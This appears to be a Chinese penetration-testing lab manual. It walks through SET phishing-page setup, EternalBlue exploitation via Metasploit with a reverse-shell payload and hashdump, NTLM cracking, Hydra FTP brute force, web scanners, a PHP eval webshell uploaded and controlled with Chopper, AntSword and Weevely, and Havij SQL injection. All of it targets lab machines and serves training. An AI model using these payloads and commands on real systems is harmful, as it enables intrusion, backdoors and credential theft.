（2）设置Burpsuite的代理服务端口 在Burpsuite软件界面上选择选项卡“Proxy”-&gt;“Options”，在Proxy Listeners模块下，将Burpsuite的代理服务端口设置为8090。 （3）暂时关闭Burpsuite的代理拦截功能 在Burpsuite软件界面上选择选项卡“Proxy”-&gt;“Intercept”，将拦截开关按钮的状态设置为“Intercept is off”。 注意：上述设置完成之后，不要关闭Burpsuite！ 3．FoxyProxy插件的简单使用（1）点击浏览器界面上的FoxyProxy图标，在弹出的对话框中点击“Options”按钮，进入FoxyProxy Options设置界面： 在FoxyProxy Options设置界面点击左侧按钮“Add”，进入“Add Proxy”设置界面： 在“Add Proxy”设置界面，为Burpsuite添加一个代理： 1234Title or Description(optional)：Burpsuite(8090)Proxy Type：HTTPProxy IP address or DNS name：127.0.0.1Port：8090 代理参数设置完成后，点击下方的“Save”按钮保存： （2）点击浏览器界面上的FoxyProxy图标，将代理方式切换至“Burpsuite(8090)”： （3）开启Burpsuite的代理拦截功能 在Burpsuite软件界面上选择选项卡“Proxy”-&gt;“Intercept”，将拦截开关按钮的状态设置为“Intercept is on”。 （4）在浏览器地址栏中输入以下URL，试图访问靶机上的SQLi-Labs的第1关： 1http://[靶机IP]/sqli-labs/Less-1/ （注意大小写） 此时，Burpsuite拦截到了此HTTP请求包： 在Burpsuite界面点击“Forward”按钮，发送此HTTP请求包，此时浏览器正常访问SQLi-Labs的第1关： 4．User-Agent Switcher插件的简单使用（1）暂时关闭Burpsuite的代理拦截功能 在Burpsuite软件界面上选择选项卡“Proxy”-&gt;“Intercept”，将拦截开关按钮的状态设置为“Intercept is off”。 （2）重新启动Firefox浏览器，点击浏览器界面上的User-Agent Switcher图标，将主机操作系统伪装成Android： （3）开启Burpsuite的代理拦截功能 在Burpsuite软件界面上选择选项卡“Proxy”-&gt;“Intercept”，将拦截开关按钮的状态设置为“Intercept is on”。 （4）在浏览器地址栏中输入以下URL，试图访问靶机上的SQLi-Labs的第1关： 1http://[靶机IP]/sqli-labs/Less-1/ （注意大小写） 此时，Burpsuite拦截到了此HTTP请求包，此请求包的头部字段User-Agent中，显示的操作系统类型为Android： 伪装成功！ 实验至此结束。 实验总结本次实验，体验了FoxyProxy、User-Agent Switcher的功能及简单配置使用。 渗透测试环境搭建与工具使用-SET配置使用实验目的熟悉SET的配置使用，掌握利用SET构建钓鱼网站的方法。 实验环境操作机：Kali2018-TS（1）操作系统：Kali Linux 2018.4 （2）登录账号密码：操作系统帐号root，密码Sangfor!7890 靶机：pt-env（1）操作系统：Windows 7 （2）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 实验原理SET（Social Engineering Toolkit）是KaliLinux中集成的一款社会工程学工具包，它是一个基于Python的开源的社会工程学渗透测试工具。这套工具包由DavidKenned设计，而且已经成为业界部署实施社会工程学攻击的标准。SET利用人们的好奇心、信任、贪婪及一些愚蠢的错误，攻击人们自身存在的弱点。SET最常用的攻击手法包括：用恶意附件对目标进行E-mail钓鱼攻击、Java Applet攻击、基于浏览器的漏洞攻击、收集网站认证信息、建立感染的便携媒体、邮件群发等攻击手段。 实验步骤1．启动SET（1）在操作机Kali2018-TS上点击左侧菜单中的终端图标，启动终端： （2）在终端使用如下命令，启动SET： 1setoolkit 2．利用SET构建钓鱼网站（1）在SET主菜单中选择第1项——Social-Engineering Attacks（社会工程学攻击）： （2）继续选择菜单第2项——Website Attack Vectors（网站攻击向量）： （3）继续选择菜单第3项——Credential Harvester Attack Method（凭证收集攻击方法）： （4）继续选择菜单第1项——Web Templates（网站模板）： 输入操作机IP，作为钓鱼网站（凭证收集器）的地址： 选择菜单第2项——Google，建立google网站模板： 此时一个伪装成Google的钓鱼网站已在操作机上建立成功！ 3．利用靶机访问钓鱼网站，观察操作机能否收集到靶机的登录凭证在靶机pt-env上启动浏览器，输入以下URL访问操作机： 1http://[操作机IP] 假如用户在登录处填入用户名admin、密码123456，并点击了“Sign in”按钮试图登录： 此时操作机上会监听到此凭证信息（用户名和密码），用户的用户名和密码遭到泄露： 实验至此结束。 实验总结本次实验，利用SET构建了钓鱼网站，并成功收集到靶机用户的登录凭证，熟悉了SET的配置使用方法。 渗透测试环境搭建与工具使用-Hashcat配置使用实验目的熟悉Hashcat的配置使用，掌握利用Hashcat破解Windows账号密码的方法。 实验环境操作机：Kali2018-TS（1）操作系统：Kali Linux 2018.4 （2）登录账号密码：操作系统帐号root，密码Sangfor!7890 靶机：pt-env（1）操作系统：Windows 7 （2）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 实验原理Hashcat是自称世界上最快的密码恢复工具，它在2015年之前拥有专有代码库，但现在作为免费软件发布。Hashcat适用于Linux、OSX和Windows等操作系统，支持多种计算核心（包括CPU、GPU、APU、DSP、FPGA等），支持的散列算法包括MicrosoftLM、NTLM哈希、MD4、MD5、SHA系列、Unix加密格式、MySQL和Cisco PIX等。 实验步骤1．借助Metasploit、利用ms17-010漏洞对靶机进行溢出攻击，并获取靶机Windows操作系统的密码Hash值（1）在操作机Kali2018-TS上点击左侧菜单中的终端图标，启动终端： （2）在终端使用如下命令，启动Metasploit终端（提示符msf&gt;）： 1msfdb init &amp;&amp; msfconsole （3）假设已知靶机存在ms17-010漏洞，在Metasploit终端分别输入以下命令，利用ms17-010漏洞对靶机进行溢出攻击： 1234567use exploit/windows/smb/ms17_010_eternalblue //使用ms17_010_eternalblue模块set LHOST [操作机IP] //设置本地主机（操作机）的IP地址set RHOST [靶机IP] //设置远程主机（靶机）的IP地址set RPORT 445 //设置目标端口set payload windows/x64/meterpreter/reverse_tcp //使用payload：meterpreter/reverse_tcpset target 0 //设置目标操作系统的类型（此处为自动识别）run //执行 溢出攻击成功后，显示meterpreter提示符： （4）在meterpreter提示符下输入以下命令，获取靶机Windows账户密码的Hash值： 1hashdump 显示结果中，将如图所标识的user账户的密码Hash值拷贝下来： 2．利用Hashcat对user账户的密码Hash值进行暴力破解（1）分别在meterpreter提示符、msf提示符下输入exit命令，退回到Kali终端： （2）在Kali终端下输入以下命令，对user账户的密码Hash值进行暴力破解： （假设已知user账户的密码是由数字、小写字母组成、长度为4的字符串） 12hashcat -a 3 -m 1000 [user账户的密码Hash值] ?h?h?h?h --force//说明：-a 3表示使用暴力破解模式（不借助字典）；-m 1000表示目标使用的Hash算法为NTLM Hash（Windows操作系统特有）；?h?h?h?h表示密码原文为4个字符长度，且每个字符均为数字或小写字母；--force表示忽略破解过程中的报错。 破解的结果，user账户的密码原文为1a2b: 3．验证user账户密码的正确性在Kali终端输入如下命令，登录靶机的远程桌面： 1rdesktop [靶机IP] 在弹出的图形化登录界面上，点击“其他用户”图标，用user账户和对应的密码（本例中为1a2b）登录： user账户远程登录成功，密码正确： 实验至此结束。 实验总结本次实验，借助Metasploit、利用ms17-010漏洞对靶机进行溢出攻击，并获取了靶机Windows操作系统的密码Hash值，然后利用Hashcat对密码Hash进行暴力破解，还原出了密码原文。在实验过程中，实现了Metasploit和Hashcat的配合使用。 渗透测试环境搭建与工具使用-Hydra与Crunch配置使用实验目的熟悉Hydra与Crunch的配置使用，掌握利用Crunch生成字典、利用Hydra对靶机FTP登录密码进行字典攻击的方法。 实验环境操作机：Kali2018-TS（1）操作系统：Kali Linux 2018.4 （2）登录账号密码：操作系统帐号root，密码Sangfor!7890 靶机：pt-env（1）操作系统：Windows 7 （2）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 实验原理（1）关于HydraHydra（九头蛇）是一个相当强大的暴力密码破解工具。该工具支持几乎所有协议的在线密码破解，如FTP、HTTP、HTTPS、MySQL、MSSQL、Oracle、Cisco、IMAP和VNC等。Hydra能够在Linux、Windows、Cygwin、Solaris11、FreeBSD8.1、OpenBSD、OSX、QNX&#x2F;Blackberry上测试和编译。 （2）关于CrunchCrunch是一种创建密码字典的工具，按照指定的规则生成密码字典，可以灵活的制定自己的字典文件。使用Crunch工具生成的密码可以输出到屏幕、保存到文件或另一个程序。 实验步骤1．开启靶机上的FTP服务（1）启动靶机pt-env，以Administrator账户登录： （2）在靶机C盘根目录下，双击鼠标左键启动Quick Easy FTP： 注：如果在C盘根目录下启动Quick Easy FTP时显示“建立空文档失败”的提示，则可以将Quick Easy FTP Server V4.0.0、users.dat、ftptrace三个文件拷贝到桌面，再启动桌面上的Quick Easy FTP ServerV4.0.0程序。 成功启动Quick Easy FTP后，在Quick Easy FTP主界面点击左上角的绿灯，启动FTP服务： 2．在操作机上使用Crunch生成用户名和密码字典（1）在操作机Kali2018-TS上点击左侧菜单中的终端图标，启动终端： （2）使用如下命令，利用Crunch生成密码字典，并保存至&#x2F;usr目录： （假设已知靶机FTP登录账号有两个，分别为li、xu，密码为由纯数字组成的2个字符长度） 1crunch 2 2 -f /usr/share/crunch/charset.lst numeric -o /usr/password.txt 生成的密码字典如下图所示： 说明：关于字符集的名称与格式，可参考&#x2F;usr&#x2F;share&#x2F;crunch&#x2F;charset.lst文件内容： 3．在操作机上使用Hydra对靶机FTP登录密码进行字典攻击（1）在终端使用如下命令，对靶机FTP登录用户名li进行密码字典攻击： 1hydra -l li -P /usr/password.txt ftp://[靶机IP] 破解结果：用户名li的密码为45。 （2）在终端使用如下命令，对靶机FTP登录用户名xu进行密码字典攻击： 1hydra -l xu -P /usr/password.txt ftp://[靶机IP] 破解结果：用户名xu的密码为13。 实验至此结束。 实验总结本次实验，利用Crunch生成了用户名和密码字典，利用Hydra对靶机FTP登录密码进行了字典攻击，熟悉了Hydra与Crunch的配置使用。 渗透测试环境搭建与工具使用-AWVS配置使用实验目的熟悉漏洞扫描工具AWVS的配置使用。 实验环境操作机：Pentest-Atk（1）操作系统：Windows 10 （2）安装的应用软件：AWVS、Havij、菜刀、蚁剑等 （3）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 靶机：A-SQLi-Labs（1）操作系统：CentOS 7 （2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境 （3）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理AWVS，全称Acunetix Web Vulnerability Scanner，是一款知名的Web网络漏洞扫描工具，可以用来测试网站、Web应用程序及接口的安全性。AWVS能够检测7000种以上的Web安全漏洞，包括SQL注入、XSS、配置不当、弱密码等常见类型。 实验步骤1．启动并登录AWVS（1）在操作机Pentest-Atk上打开Chrome浏览器，在地址栏中输入以下URL启动AWVS： 1https://localhost:3443 （2）在认证界面，输入用户名&#x41;&#100;&#109;&#105;&#x6e;&#64;&#x61;&#119;&#x76;&#115;&#x2e;&#x63;&#x6f;&#109;，密码Admin123，然后点击“Login”按钮登录AWVS的主界面： 2．设置扫描目标并执行扫描任务在AWVS的主界面，点击左侧菜单“Target”-&gt;“Add Target”，将以下URL作为扫描目标： 1http://[靶机IP]/sqli-labs 设置完成后直接点击右上角“Save”按钮，此时会自动进入目标设置界面。在此界面下，可以根据需要对一些参数进行设置。 比如设置扫描速度（本例中为Fast）： 设置网站登录凭证（本例中未设置）： 设置爬取选项（本例中为默认）： … 本例中所有扫描参数设置保持默认，直接点击右上角“Scan”按钮： 弹出如下对话框： 直接点击“Create Scan”按钮，创建一个扫描任务并开始执行： 等待约2分钟后，扫描完成。 3．查看扫描结果在“Scan”-&gt;“Scan information”页面下可查看总体的扫描信息： 在“Scan”-&gt;“Vulnerabilities”页面下可查看扫描到的漏洞信息： 在“Scan”-&gt;“Site Structure”页面下可查看网站的目录架构： 在“Scan”-&gt;“Events”页面下可查看扫描过程中的事件： 4．生成扫描报告在AWVS的主界面，点击左侧菜单“Scans”，钩选刚刚执行完成的扫描任务： 点击页面上方的“Generate Report”按钮，选择报告类型为“快速报告”（即“Standard Reports”-&gt;“Quick”）： 此时在AWVS的主界面，点击左侧菜单“Reports”，会看到刚刚生成的报告记录： 下载并查看PDF格式的报告： 实验至此结束。 实验总结本次实验，熟悉了漏洞扫描工具AWVS的配置使用。 渗透测试环境搭建与工具使用-Nikto配置使用实验目的熟悉漏洞扫描工具Nikto的配置使用。 实验环境操作机：Kali2018-TS（1）操作系统：Kali Linux 2018.4 （2）登录账号密码：操作系统帐号root，密码Sangfor!7890 靶机：A-SQLi-Labs（1）操作系统：CentOS 7 （2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境 （3）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理Nikto是一款基于Perl语言开发的开源Web扫描评估软件，可以对Web服务器进行多项安全测试，能在230多种服务器上扫描出2600多种有潜在危险的文件、CGI及其他问题。Nikto可以扫描指定主机的WEB类型、主机名、指定目录、特定CGI漏洞、返回主机允许的HTTP模式等。 实验步骤1．启动Nikto（1）在操作机Kali2018-TS上点击左侧菜单中的终端图标，启动终端： （2）使用如下命令，启动Nikto并查看其命令格式和可用参数： 1nikto -Help 2．利用Nikto对靶机网站进行漏洞扫描使用如下命令，利用Nikto对靶机A-SQLi-Labs上的SQLi-Labs网站进行漏洞扫描，并将扫描结果保存至&#x2F;usr&#x2F;result.html中： 1nikto -host http://[靶机IP] -c /sqli-labs -o /usr/result.html -F htm 扫描结果： 输出的文档： 3．利用Nikto对靶机网站进行Web子目录扫描（1）为体验Web子目录扫描的功能，我们在&#x2F;usr路径下手工新建一个sub.txt文档作为字典，文档内容如图所示： （2）使用如下命令，利用Nikto对靶机A-SQLi-Labs上的网站进行子目录扫描： 1nikto -host http://[靶机IP] -mutate 6 -mutate-option /usr/sub.txt 扫描结果：靶机网站的两个子目录&#x2F;dvwa和&#x2F;sqli-labs被找到！ 实验至此结束。 实验总结本次实验，熟悉了漏洞扫描工具Nikto的配置使用。 渗透测试环境搭建与工具使用-OWASP ZAP配置使用实验目的熟悉漏洞扫描工具OWASP ZAP的配置使用。 实验环境操作机：Kali2018-TS（1）操作系统：Kali Linux 2018.4 （2）登录账号密码：操作系统帐号root，密码Sangfor!7890 靶机：A-SQLi-Labs（1）操作系统：CentOS 7 （2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境 （3）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理OWASP ZAP（OWASP Zed AttackProxy，QWASP攻击代理服务器）是世界上最受欢迎的免费安全工具之一。ZAP可以帮助我们在开发和测试应用程序过程中自动发现Web应用程序中的安全漏洞。另外，它也是一款提供给具备丰富经验的渗透测试人员进行人工安全测试的优秀工具。 实验步骤1．启动OWASP ZAP（1）在操作机Kali2018-TS上点击桌面左上角菜单“Applications”-&gt;“03-Web Application Analysis”-&gt;“owasp-zap”，启动OWASP ZAP： 启动后的OWASP ZAP主界面如下图所示： 2．OWASP ZAP代理功能的使用（1）在OWASP ZAP主界面选择菜单项“Tools”-&gt;“Options”-&gt;“Local Proxies”，设置如图所示的代理参数并点击“OK”按钮确认： 12Address：localhost或127.0.0.1Port：8091 （2）启动Firefox浏览器，利用FoxyProxy插件新建一个代理： 代理参数如下图所示： 1234Title or Description(optional)：OWASP ZAP(8091)Proxy Type：HTTPProxy IP address or DNS name：127.0.0.1Port：8091 设置完成后，点击“Save”按钮保存。 （3）在浏览器上，将FoxyProxy插件的代理切换为“OWASP ZAP(8091)”： 然后，在地址栏输入以下URL，访问靶机A-SQLi-Labs上的SQLi-Labs网站的第1关： 1http://[靶机IP]/sqli-labs/Less-1/ （注意大小写） 此时，在OWASP ZAP主界面能够看到代理抓包的信息： 3．OWASP ZAP漏洞扫描功能的使用在OWASP ZAP主界面右上窗口中，选择“Quick Start标签页”，在“URL to attack”处填写下列URL，并点击“Attack”按钮，启动对SQLi-Labs网站Less-1的扫描： 1http://[靶机IP]/sqli-labs/Less-1/ 当扫描过程中检测出漏洞，OWASP ZAP会产生报警信息，如下图所示： 实验至此结束。 实验总结本次实验，熟悉了漏洞扫描工具OWASP ZAP的配置使用。 渗透测试环境搭建与工具使用-“中国菜刀”配置使用实验目的熟悉PHP一句话木马的编写及Webshell管理工具“中国菜刀”的配置使用。 实验环境操作机：Pentest-Atk（1）操作系统：Windows 10 （2）安装的应用软件：AWVS、Havij、菜刀、蚁剑等 （3）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 靶机：A-SQLi-Labs（1）操作系统：CentOS 7 （2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境 （3）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理（1）关于Webshell Webshell是以ASP、PHP、JSP或者CGI等网页文件形式存在的一种代码执行环境，主要用于网站管理、服务器管理、权限管理等操作。Webshell使用方法简单，只需上传一个代码文件，通过网址访问，便可进行很多日常操作，极大地方便了使用者对网站和服务器的管理。正因如此，也有小部分人将代码修改后当作后门程序使用，以达到控制网站服务器的目的。 （2）关于中国菜刀 中国菜刀是一款专业的Webshell管理软件，用途广泛，使用方便，小巧实用，只要支持动态脚本的网站，都可以用中国菜刀来进行管理。 实验步骤1．编写PHP一句话木马（Webshell）在操作机Pentest-Atk桌面新建一个文本文档并更名为muma.php： 鼠标右键单击muma.php，在弹出的菜单中选择“Edit with Notepad++”: 用Notepad++打开此文件后，在文件中输入以下代码并保存： 1&lt;?php @eval($_POST[&#x27;123456&#x27;]); ?&gt; 2．利用靶机的文件上传漏洞，将此木马文件（Webshell）上传至靶机（1）在操作机Pentest-Atk上启动浏览器，在地址栏中输入以下URL访问靶机上的DVWA网站： 1http://[靶机IP]/dvwa/ （注意大小写） （2）成功登录DVWA网站后，在网站主页左侧菜单选择DVWA Security，将网站的安全级别设置为“Low”： （3）在DVWA网站主页左侧菜单选择“File upload”进入文件上传训练关卡，将muma.php上传至靶机，并记下文件上传的路径： 3．利用“中国菜刀”连接靶机上的muma.php（1）在操作机Pentest-Atk上进入桌面文件夹tools&#x2F;中国菜刀(过狗)，鼠标左键双击“中国菜刀(过狗).exe”程序，运行“中国菜刀”： （2）在“中国菜刀”主界面空白处单击鼠标右键，在弹出的菜单中选择“添加”， 添加一条Webshell管理项： 12地址：http://[靶机IP]/dvwa/hackable/uploads/muma.php连接密码：123456 添加完成后，会看到主界面多了一条Webshell管理项： 4．利用“中国菜刀”对靶机进行虚拟终端及文件操作（1）虚拟终端操作 选中muma.php所在的Webshell管理项，单击鼠标右键，在弹出的菜单中选择“虚拟终端” 打开虚拟终端界面后，可以像操作本地机器一样，对靶机执行一些操作系统命令（如whoami、id、netstat -an等）： （2）文件操作 选中muma.php所在的Webshell管理项，单击鼠标右键，在弹出的菜单中选择“文件管理”： 打开文件管理界面后，可以像操作本地机器一样，对靶机系统进行一些操作（如上传文件、下载文件、修改文件属性等）： 实验至此结束。 实验总结本次实验，熟悉了PHP一句话木马的编写及“中国菜刀”的配置使用。 渗透测试环境搭建与工具使用-“中国蚁剑”配置使用实验目的熟悉PHP一句话木马的编写及Webshell管理工具“中国蚁剑”的配置使用。 实验环境操作机：Pentest-Atk（1）操作系统：Windows 10 （2）安装的应用软件：AWVS、Havij、菜刀、蚁剑等 （3）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 靶机：A-SQLi-Labs（1）操作系统：CentOS 7 （2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境 （3）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理（1）关于Webshell Webshell是以ASP、PHP、JSP或者CGI等网页文件形式存在的一种代码执行环境，主要用于网站管理、服务器管理、权限管理等操作。Webshell使用方法简单，只需上传一个代码文件，通过网址访问，便可进行很多日常操作，极大地方便了使用者对网站和服务器的管理。正因如此，也有小部分人将代码修改后当作后门程序使用，以达到控制网站服务器的目的。 （2）关于中国蚁剑 蚁剑是一个开放源代码、跨平台的Webshell管理工具，旨在满足渗透测试人员以及具有权限和&#x2F;或授权的安全研究人员以及网站管理员的需求。 实验步骤1．编写PHP一句话木马（Webshell）在操作机Pentest-Atk桌面新建一个文本文档并更名为muma.php： 鼠标右键单击muma.php，在弹出的菜单中选择“Edit with Notepad++”: 用Notepad++打开此文件后，在文件中输入以下代码并保存： 1&lt;?php @eval($_POST[&#x27;123456&#x27;]); ?&gt; 2．利用靶机的文件上传漏洞，将此木马文件（Webshell）上传至靶机（1）在操作机Pentest-Atk上启动浏览器，在地址栏中输入以下URL访问靶机上的DVWA网站： 1http://[靶机IP]/dvwa/ （注意大小写） （2）成功登录DVWA网站后，在网站主页左侧菜单选择DVWA Security，将网站的安全级别设置为“Low”： （3）在DVWA网站主页左侧菜单选择“File upload”进入文件上传训练关卡，将muma.php上传至靶机，并记下文件上传的路径： 3．利用“中国蚁剑”连接靶机上的muma.php（1）在操作机Pentest-Atk上进入桌面文件夹tools&#x2F;antSword&#x2F;antSword-Loader-v4.0.3-win32-x64，鼠标左键双击“AntSword.exe”程序，运行“中国蚁剑”： 初次运行“中国蚁剑”时，需要初始化。点击“中国蚁剑”主界面的“初始化”按钮，将桌面tools&#x2F;antSword&#x2F;antSword-master指定为“中国蚁剑”的工作目录： 指定完成后，界面会提示手动重启蚁剑程序。可再次进入桌面文件夹tools&#x2F;antSword&#x2F;antSword-Loader-v4.0.3-win32-x64，运行“AntSword.exe”程序： （2）在“中国蚁剑”主界面空白处单击鼠标右键，在弹出的菜单中选择“添加数据”， 添加一条Webshell管理项： 123URL地址：http://[靶机IP]/dvwa/hackable/uploads/muma.php连接密码：123456连接类型：PHP 设置完成后点击左上角的“添加”按钮，会看到主界面多了一条Webshell管理项： 4．利用“中国蚁剑”对靶机进行虚拟终端及文件操作（1）虚拟终端操作 选中muma.php所在的Webshell管理项，单击鼠标右键，在弹出的菜单中选择“虚拟终端” 打开虚拟终端界面后，可以像操作本地机器一样，对靶机执行一些操作系统命令（如whoami、id、netstat -an等）： （2）文件操作 选中muma.php所在的Webshell管理项，单击鼠标右键，在弹出的菜单中选择“文件管理”： 打开文件管理界面后，可以像操作本地机器一样，对靶机系统进行一些操作（如上传文件、下载文件、修改文件属性等）： （3）数据操作 选中muma.php所在的Webshell管理项，单击鼠标右键，在弹出的菜单中选择“数据操作”： 打开文件管理界面后，可以对靶机上的数据库系统进行一些操作： 实验至此结束。 实验总结本次实验，熟悉了PHP一句话木马的编写及“中国蚁剑”的配置使用。 渗透测试环境搭建与工具使用-Weevely配置使用实验目的熟悉Webshell管理工具Weevely的配置使用。 实验环境操作机：Kali2018-TS（1）操作系统：Kali Linux 2018.4 （2）登录账号密码：操作系统帐号root，密码Sangfor!7890 靶机：A-SQLi-Labs（1）操作系统：CentOS 7 （2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境 （3）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理Weevely是一款Python编写的Webshell管理工具，它最大的优点在于跨平台，可以算作是Linux下的一款菜刀替代工具（限于PHP）。 实验步骤1．启动Weevely在操作机Kali2018-TS上点击桌面左上角菜单“Applications”-&gt;“10-Post Exploitation”-&gt;“weevely”，启动Weevely： 2．利用Weevely生成专用Webshell在终端下输入以下命令，利用Weevely生成专用Webshell： 12weevely generate 123456 /usr/muma.php//说明：生成的Webshell文件名为muma.php，保存于/usr路径下，连接密码为123456 3．利用靶机的文件上传漏洞，将此Webshell上传至靶机（1）在操作机Kali2018-TS上启动Firefox浏览器，在地址栏中输入以下URL访问靶机上的DVWA网站： 1http://[靶机IP]/dvwa/ （注意大小写） （2）成功登录DVWA网站后，在网站主页左侧菜单选择DVWA Security，将网站的安全级别设置为“Low”： （3）在DVWA网站主页左侧菜单选择“File upload”进入文件上传训练关卡，将muma.php上传至靶机，并记下文件上传的路径： 4．利用Weevely远程连接Webshell，并获得靶机的控制权（1）在Kali终端下输入以下命令，利用Weevely远程连接刚刚上传至靶机的muma.php： 1weevely http://[靶机IP]/dvwa/hackable/uploads/muma.php 123456 连接成功后，直接输入回车即可获取靶机的shell： （2）获取靶机的shell后，可以像操作本地主机一样，对靶机执行一些远程操作，如用file_ls查看文件和目录： 用system_info查看操作系统信息： 用file_download将远程目录下的文件下载到本地： 实验至此结束。 实验总结本次实验，熟悉了Webshell管理工具Weevely的配置使用。 渗透测试环境搭建与工具使用-“御剑”配置使用实验目的了解Web目录扫描的原理，熟悉“御剑”Web目录扫描工具的配置使用。 实验环境操作机：Pentest-Atk（1）操作系统：Windows 10 （2）安装的应用软件：御剑等 （3）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 靶机：A-SQLi-Labs（1）操作系统：CentOS 7 （2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境 （3）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理网站目录和敏感文件扫描是网站测试中最基本的手段之一。如果通过该方法发现了网站后台，可以尝试暴库、SQL注入等方式进行安全测试；如果发现敏感目录或敏感文件，能帮我们获取如php环境变量、robots.txt、网站指纹等信息；如果扫描出了一些上传的文件，我们甚至可能通过上传功能（一句话恶意代码）获取网站的权限。“御剑”被誉为国内第一后台扫描神器，拥有图形化页面，简单易上手。利用“御剑”对网站目录进行扫描，实际就是通过发送HTTP请求，并分析网站服务器返回的信息来判断当前目录或文件是否真实存在。在判断过程中利用了字典爆破的方法，一般来说，字典越多越丰富，扫描到的结果也越多，准确性也越高。 实验步骤1．尝试访问DVWA、SQLi-Labs、Webug网站在操作机Pentest-Atk上打开浏览器，尝试访问以下网站： 1（1）http://[靶机IP]/dvwa 1（2）http://[靶机IP]/sqli-labs 1（3）http://[靶机IP]/webug 上述三个网站均能正常访问。 2．使用“御剑”对靶机的三个网站进行目录扫描（默认方式）在操作机Pentest-Atk上打开桌面文件夹tools&#x2F;御剑后台扫描珍藏版&#x2F;，鼠标左键双击“御剑后台扫描工具.exe”程序启动“御剑”： 在“御剑”主界面的“域名”框内填写需要进行目录扫描的网站URL，点击“开始扫描”按钮（其余参数保持默认），即可得到各网站的扫描结果： （1）http:&#x2F;&#x2F;[靶机IP]&#x2F;dvwa （2）http:&#x2F;&#x2F;[靶机IP]&#x2F;sqli-labs （3）http:&#x2F;&#x2F;[靶机IP]&#x2F;webug 3．将“御剑”的字典适当丰富化，并再次对靶机的三个网站进行目录扫描在操作机Pentest-Atk上打开桌面文件夹tools&#x2F;御剑后台扫描工具&#x2F;配置文件&#x2F;（此为“御剑”的字典文件存放目录），打开DIR.txt文件，在文件末尾处添加6条记录并保存： 123456/hackable/config/images/sql-connections/pentest/tupian 配置完成后，重新启动“御剑”，再次对上述三个网站进行目录扫描： 1（1）http://[靶机IP]/dvwa 1（2）http://[靶机IP]/sqli-labs 1（3）http://[靶机IP]/webug 此现象说明，字典越丰富，“御剑”扫描到的结果准确性越高。 实验至此结束！ 实验总结本次实验，体验了“御剑”Web目录扫描工具的配置使用过程。扫描工具本身以及一本强大的字典，是执行网站目录扫描的必备条件。 渗透测试环境搭建与工具使用-Havij配置使用实验目的熟悉自动化注入工具Havij的配置使用，掌握利用其进行SQL注入的方法。 实验环境实验环境操作机：Pentest-Atk（1）操作系统：Windows 10 （2）安装的应用软件：Havij等 （3）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 靶机：A-SQLi-Labs（1）操作系统：CentOS 7 （2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境 （3）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理Havij是一款十分优秀的SQL自动化注入工具。Havij不仅能够自动挖掘可利用的SQL查询，还能够识别后台数据库类型、检索数据的用户名和密码hash、转储表和列、从数据库中提取数据，甚至访问底层文件系统和执行系统命令。Havij支持广泛的数据库系统，支持参数配置以躲避IDS，同时也支持代理、后台登录地址扫描等功能。 实验步骤本实验的目标是：以SQLi-Labs网站的Less-5为入口，借助Havij工具获取SQLi-Labs网站的登录用户名和密码。1．尝试访问SQLi-Labs网站的Less-5关卡在操作机Pentest-Atk打开FireFox浏览器，并访问靶机A-SQLi-Labs上的SQLi-Labs网站Less-5。访问的URL为： 1http://[靶机IP]/sqli-labs/Less-5/ (注意大小写) 登录后，根据网页提示，先给定一个GET参数，即： 1http://[靶机IP]/sqli-labs/Less-5/?id=1 此时页面显示“You are in…”。 2．利用Havij对该网站进行注入尝试（1）在操作机Pentest-Atk打开桌面文件夹tools&#x2F;装机工具&#x2F;Havij&#x2F;，运行此路径下的“注册.bat”文件进行注册： （2）继续运行此路径下的“Havij 1.15 Pro Cracked By Hmily[LCG].exe”程序： 运行后的Havij主界面如图所示： （3）在Havij主界面的Target文本框中，填写如下URL（即目标网站）： 1http://[靶机IP]/sqli-labs/Less-5/?id=1 Database框中选择“MySQL error based”，Method框中选择“GET”，设置完参数后点击“Analyze”按钮执行注入： 执行完成后，Havij的状态消息栏会显示目标网站后台数据库的基本信息： 服务器信息：Apache&#x2F;2.4.6（CentOS），PHP&#x2F;5.5.38注入点类型：string（’）（即字符型注入点，单引号）当前数据库库名：security （4）继续在Havij主界面，先点击“Tables”按钮，再点击“Get DBs”按钮，执行结果将显示后台系统中所有的数据库库名： 在此结果下，进一步选中security数据库，并点击“Get Tables”按钮，执行结果将显示security数据库中的所有数据表表名： 在此结果下，进一步选中users数据表，并点击“Get Columns”按钮，执行结果将显示users数据表中的所有字段名： 在次结果下，进一步同时选中id、username、password三个字段，并点击“Get Data”，执行结果将显示id、username、password三个字段的全部值： 至此，通过Havij工具获取了SQLi-Labs网站的全部登录用户名和密码。 实验至此结束！ 实验总结本次实验，熟悉了Havij自动化注入工具的配置使用，并体验了利用Havij对存在SQL注入漏洞的网站进行自动化注入的过程。","tags":["sxf","Red"],"categories":["Experiments"]},{"title":"某厂产业教育 - 网络安全基础实验","path":"/2024/09/12/红蓝攻防/Ⅰ网络安全基础实验步骤/","content":"OPENSSL基础使用实验目的掌握常见的密码学算法应用，包含des aes md5 rsa等 实验环境一台Centos 7.2 